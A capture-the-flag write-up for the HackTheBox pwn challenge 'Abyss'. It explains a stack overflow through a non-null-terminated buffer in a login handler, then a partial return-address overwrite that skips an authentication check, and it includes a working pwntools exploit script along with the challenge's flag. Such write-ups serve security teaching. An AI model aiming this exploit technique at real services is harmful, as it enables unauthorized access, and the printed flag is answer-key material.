---
title: "Abyss"
ctf: "HTB"
date: 2026-06-11
category: pwn
difficulty: easy
points: N/A
flag_format: "HTB{...}"
author: "gluppler"
---

# Abyss

## Summary

Stack overflow via non-null-terminated buffer in `cmd_login`. The PASS copy loop reads past buf (512 bytes, no null) into user (non-null from USER input), then writes past pass into the return address. Partial 3-byte overwrite redirects to `cmd_read+0x42` (skipping the login check) to read the flag.

## Solution

### Step 1: Vulnerability

In `cmd_login()`, USER and PASS are read into a 512-byte `buf`, then copied via a while-loop that stops at null. If buf is filled completely (512 bytes, no null), the loop reads out-of-bounds into user and pass. Stack layout: `[buf][user][pass][return address]`.

Sending `PASS ` + 507 non-null bytes fills buf. The copy continues past buf into user (non-null from USER step), writing past pass into saved rbp and return address.

### Step 2: Partial overwrite

The return address from `cmd_login` is `main+0x1c0` = `0x4017ba`. Target is `cmd_read+0x42` = `0x4014eb`. Both have the same upper 5 bytes (`0x0000000000`). Only 3 bytes need overwriting, done by bytes at `user[29..31]` in the USER input.

Jumping to `0x4014eb` skips the `if (!logged_in)` check (EAX = non-zero from strcmp). `cmd_read` then reads a filename from stdin and prints its contents.

```python
from pwn import *
import time

context.arch = 'amd64'
io = remote('154.57.164.68', 32547)

io.send(p32(0))  # LOGIN
time.sleep(0.2)
io.send(b'USER ' + b'AAAAAAAABBBBBBBBC\x1cDDDDEEEEEEE' + p32(0x4014eb))
time.sleep(0.2)
io.send(b'PASS ' + b'D' * (512 - 5))
time.sleep(0.2)
io.send(b'/app/flag.txt')
print(io.recvall(timeout=5).decode())
```

## Flag

```
HTB{nUlL_t3rmIn4t1on_1s_k3y!}
```
